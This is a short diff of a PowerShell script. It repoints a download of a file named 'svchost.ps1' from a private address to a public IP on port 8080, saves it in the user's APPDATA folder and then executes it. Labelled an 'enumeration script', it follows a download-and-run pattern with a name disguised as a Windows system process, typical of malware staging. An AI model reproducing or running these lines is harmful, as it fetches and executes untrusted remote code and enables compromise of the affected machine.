@@ -1,5 +1,5 @@
 # Retrieve svchost.ps1 Enumeration Script
-iwr "http://10.10.99.7/svchost.ps1" -o $env:APPDATA\svchost.ps1
+iwr "http://191.232.179.179:8080/svchost.ps1" -o $env:APPDATA\svchost.ps1
 
 # Execute svchost.ps1 Enumeration Script
 . $env:APPDATA\svchost.ps1
